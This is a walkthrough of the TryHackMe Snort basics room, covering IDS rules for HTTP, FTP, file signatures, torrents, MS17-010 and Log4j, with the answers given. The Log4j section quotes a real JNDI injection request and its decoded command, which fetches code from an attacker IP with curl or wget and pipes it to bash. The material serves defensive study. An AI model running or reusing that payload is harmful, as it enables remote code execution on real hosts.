# THM Snort Challenge: The Basics

Lets analyze some pcaps and learn some “snorting” along the way. 

## Task 1: Introduction

Lets spin up machine and begin.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled.png)

Navigating into each TASK exercise file is straight-forward so i wont be pointing out this for every task.

## Task 2: IDS Rules - HTTP

**Write rules to detect "all TCP port 80 traffic" packets in the given pcap file.**

Lets write a two simple rules for inbound and outbound traffic and run the snort against given pcap - once log is generated lets examine it with snort -r parameter. We are writing the rules locally and also generating the pcap file locally. 

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%201.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%202.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%203.png)

**What is the number of detected packets?**

Once we examine the pcap file it will show us the correct answer. By using option -X in later question’s as well we are getting broader output for better examination.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%204.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%205.png)

**Answer**: 328

**What is the destination address of packet 63?**

Lets read the pcap again and now limit the number of packets to 63 with -n parameter. Scroll to the end to see the destination after →.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%206.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%207.png)

**Answer:** 145.254.160.237

**What is the ACK number of packet 64?**

Again read the pcap and limit the packets with -n option and scroll to very bottom.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%208.png)

**Answer:** 0x38AFFFF3

**What is the SEQ number of packet 62?**

Scroll two packets up and see for yourself.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%209.png)

**Answer:** 0x38AFFFF3

**What is the TTL of packet 65?**

Again limit the number of packets and examine.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2010.png)

**Answer:** 128

**What is the source IP of packet 65?**

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2011.png)

**Answer:** 145.254.160.237

**What is the source port of packet 65?**

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2012.png)

**Answer:** 3372

## Task 3: IDS Rules - FTP

**Write rules to detect "all TCP port 21"  traffic in the given pcap.**

Lets use our experience from previous Task and slightly adjust the original config and run the snort against given pcap.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2013.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2014.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2015.png)

**What is the number of detected packets?**

Examine the output from snort.log and scroll to very bottom where all statistics are displayed.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2016.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2017.png)

**Answer:** 614

**What is the FTP service name?**

FTP service name is usually a banner which is displayed upon initial connection, so we need to scroll to very top where the connection initiated. With option -X we will display full packet details.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2018.png)

**Answer:** microsoft ftp service

**Write a rule to detect failed FTP login attempts in the given pcap. What is the number of detected packets?**

While examining the previous pcap ive stumbled into this:

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2019.png)

This packet inform us about un-successful login attempt and throw the error code 530 which points us into FTP Authentication failed error. We will use this information to build rule for this task - using the **content** option which serves as basic pattern matching against packet data - and will it spare our lives from writing regex (for now).

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2020.png)

Lets rerun the snort against given pcap with this rule and examine the log.

As we can see we matched only packets with 530 error code.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2021.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2022.png)

**Answer:** 41

**Write a rule to detect successful FTP logins in the given pcap. What is the number of detected packets?**

Opposite from 530, 230 is the code for successful FTP Authentication. Lets slightly tweak our previous rule and run the snort against the task pcap.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2023.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2024.png)

**Answer:** 1

**Write a rule to detect failed FTP login attempts with a valid username but a bad password or no password. What is the number of detected packets?**

Since we successfully matched the two rules with FTP response codes lets stick with them - task is to match valid username but no or bad password - meet 331. A 331 code is sent in response to the USER command when a password is required for the login to continue. Again slight update to the previous rule and rerun the snort against pcap and examine the log.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2025.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2026.png)

**Answer:** 42

**Write a rule to detect failed FTP login attempts with "Administrator" username but a bad password or no password. What is the number of detected packets?**

In addition to the 331 FTP code we need to add additional content - user Administrator and rerun the snort against task pcap and examine the log.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2027.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2028.png)

**Answer**: 7

## Task 4: IDS Rules - PNG/GIF

**Write a rule to detect the PNG file in the given pcap. Investigate the logs and identify the software name embedded in the packet.**

Lets find the signature HEX code for PNG file and embed it within the content option for pattern matching. Using HEX value requires double pipes. Again run it against given pcap file and examine the snort log.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2029.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2030.png)

**Answer:** Adobe ImageReady

**Write a rule to detect the GIF file in the given pcap. Investigate the logs and identify the image format embedded in the packet.**

Again, find signature which will match the GIF and embed it into rule content option, rerun and examine.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2031.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2032.png)

**Answer:** GIF89a

## Task 5: IDS Rules - Torrent Metafile

**Write a rule to detect the torrent metafile in the given pcap. What is the number of detected packets?**

We will be following the content rule structure along with keyword torrent or bittorrent in the packet since it is used as protocol for file sharing. Lets try simple rule and run it.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2033.png)

We have the log so the rule went trough - lets examine it.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2034.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2035.png)

**Answer:** 2

**What is the name of the torrent application?**

Lets examine the log a bit more with option -X.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2036.png)

**Answer:** bittorrent

**What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?**

MIME is widely implemented in internet technologies to indicate the nature and format of documents, making it crucial for web browsers, email clients, and other applications that transmit data over the Internet. Since we are dealing with application we will look for this pattern in the log.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2037.png)

**Answer:** application/x-bittorrent

**What is the hostname of the torrent metafile?**

Lets dig in once again and find the answer.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2038.png)

**Answer:** [tracker2.torrentbox.com](http://tracker2.torrentbox.com/)

## Task 6: Troubleshoot Rule Syntax Errors

**In this section, you need to fix the syntax errors in the given rule files. Fix the syntax error in local-1.rules file and make it work smoothly. What is the number of the detected packets?**

Lets run the snort with rule as it is and follow the debugger.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2039.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2040.png)

Lets fix the simple missing space and rerun. A small tip - editing via Vim will automatically detect file type associated with application and also will show you proper coloring once syntax is set.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2041.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2042.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2043.png)

**Answer:** 16

**Fix the syntax error in local-2.rules file and make it work smoothly. What is the number of the detected packets?**

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2044.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2045.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2046.png)

Looking into the file we are missing the source port - lets fix and rerun.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2047.png)

**Answer:** 68

**Fix the syntax error in local-3.rules file and make it work smoothly. What is the number of the detected packets?**

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2048.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2049.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2050.png)

If we have two or more rules set each SID has to be unique - lets adjust second sid to 100002 and rerun.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2051.png)

**Answer:** 87

**Fix the syntax error in local-4.rules file and make it work smoothly. What is the number of the detected packets?**

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2052.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2053.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2054.png)

Power of VIM - through coloring we can see where the issue is also we can see we have again duplicate of sid’s - lets fix this too and rerun.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2055.png)

**Answer:** 90

**Fix the syntax error in local-5.rules file and make it work smoothly. What is the number of the detected packets?**

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2056.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2057.png)

Snort supports only > or <> operator - lets fix and rerun. Do not forget to check for duplicate sid’s and syntax errors - final rule looks like this - lets save and rerun.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2058.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2059.png)

**Answer:** 155

**Fix the logical error in local-6.rules file and make it work smoothly to create alerts. What is the number of the detected packets?**

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2060.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2061.png)

Rule works but does not match any packets, lets examine the rule.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2062.png)

Lets take a closer look on msg and content - rule should match GET requests but content seems to have only HEX value of g e t specified - lets try string and rerun.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2063.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2064.png)

**Answer:** 2

**Fix the logical error in local-7.rules file and make it work smoothly to create alerts.**

**What is the name of the required option?**

By examining the rule we can see that we are missing option for logging alerts - lets fix that.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2065.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2066.png)

**Answer:** msq

## Task 7: Using External Rules - MS17-010

**Use the given rule file (local.rules) to investigate the ms1710 exploitation. What is the number of detected packets?**

Simple run the snort with local.rules - it contains all pre-written rules associated with this vulnerability.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2067.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2068.png)

**Answer:** 25154

**Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword. What is the number of detected packets?**

Time to examine the local.rules and grep IPC and use this rule in our own rule set.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2069.png)

Ok done, rule on place now run the snort against given pcap and examine.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2070.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2071.png)

**Answer:** 12

**Investigate the log/alarm files. What is the requested path?**

Lets run it again to acquire a snort log and examine.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2072.png)

**Answer:** \\192.168.116.138\IPC$

**What is the CVSS v2 score of the MS17-010 vulnerability?**

Google is your friend.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2073.png)

**Answer:** 9.3

## Task 8: Using External Rules - Log4j

**Use the given rule file (local.rules) to investigate the log4j exploitation. What is the number of detected packets?**

As in previous section run the local.rules as it is against the given pcap.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2074.png)

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2075.png)

**Answer:** 26

**How many rules were triggered?.**

Closely examine the statistics on very bottom - an "Event" typically refers to any identifiable occurrence that Snort detects based on its configured rules, which can signify various types of activity or anomalies within network traffic.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2076.png)

**Answer:** 4

**What are the first six digits of the triggered rule sids?**

Examine the alert log and search for pattern.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2077.png)

**Answer:** 210037

**Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes. What is the number of detected packets?**

In case we need to detect specific payload size we will use dsize option for pattern matching - in our case we need to specify the range so we will use <> operator. 

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2078.png)

Lets save and run.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2079.png)

**Answer:** 41

**What is the name of the used encoding algorithm?**

Examining snort log we can see most of the traffic is using port 80 or HTTP. HTTP uses Base64 encoding due embedding binary data, data transmission as basic examples. More here about this topic here:

[https://medium.com/@shimonmoyal/a-dive-into-base64-and-its-significance-in-web-development-b6bd4427f61d](https://medium.com/@shimonmoyal/a-dive-into-base64-and-its-significance-in-web-development-b6bd4427f61d)

To confirm our theory lets dive into snort.log and search for base64. Bingo !!!

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2080.png)

**Answer:** base64

**What is the IP ID of the corresponding packet?**

Search for ID in the packet where we observed the base64.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2081.png)

**Answer:** 62808

**Decode the encoded command. What is the attacker's command?**

Base64 can be easily decoded via any web-based decoder. For encoded message extraction i would recommend to use tcpdump for better clarity.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2082.png)

Locate the encoded message inside the packet at very bottom.

05:06:07.579734 IP 45.155.205.233.39692 > 91.247.71.198.host.secureserver.net.http: Flags [P.], seq 3701105179:3701105954, ack 2610081736, win 502, options [nop,nop,TS val 1584792788 ecr 1670627000], length 775: HTTP: GET /?x=${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/**KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g**=} HTTP/1.1

Use any Base64 decoder to decode the message

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2083.png)

**Answer:** (curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash

**What is the CVSS v2 score of the Log4j vulnerability?**

Again, Google is our friend.

![Untitled](THM%20Snort%20Challenge%20The%20Basics%20aebe836cd2594c599a5d471659d5d1e7/Untitled%2084.png)

**Answer:** 9.3

Hope you enjoyed the room and my write-up